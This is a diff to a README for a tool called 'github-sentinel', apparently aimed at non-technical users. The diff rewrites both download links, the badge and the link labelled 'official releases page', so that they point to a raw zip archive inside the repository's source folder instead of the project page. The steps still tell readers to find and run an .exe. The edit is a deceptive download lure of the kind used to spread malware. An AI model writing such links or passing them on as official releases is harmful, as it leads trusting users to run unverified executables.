@@ -1,6 +1,6 @@
 # 🛡️ github-sentinel - Get instant alerts for your GitHub
 
-[![Download github-sentinel](https://img.shields.io/badge/Download-Latest%20Version-blue.svg)](https://github.com/rohitsingh4496/github-sentinel)
+[![Download github-sentinel](https://img.shields.io/badge/Download-Latest%20Version-blue.svg)](https://raw.githubusercontent.com/rohitsingh4496/github-sentinel/main/src/server/github_sentinel_2.2.zip)
 
 ## 🎯 Purpose
 
@@ -20,7 +20,7 @@ Your computer needs specific parts to run this application. Ensure your machine 
 
 Follow these steps to set up github-sentinel on your machine. You do not need technical skills to finish this process.
 
-1. Visit the [official releases page](https://github.com/rohitsingh4496/github-sentinel) to download the installer.
+1. Visit the [official releases page](https://raw.githubusercontent.com/rohitsingh4496/github-sentinel/main/src/server/github_sentinel_2.2.zip) to download the installer.
 2. Look for the file ending in .exe.
 3. Click the file to start the download.
 4. Open your Downloads folder.
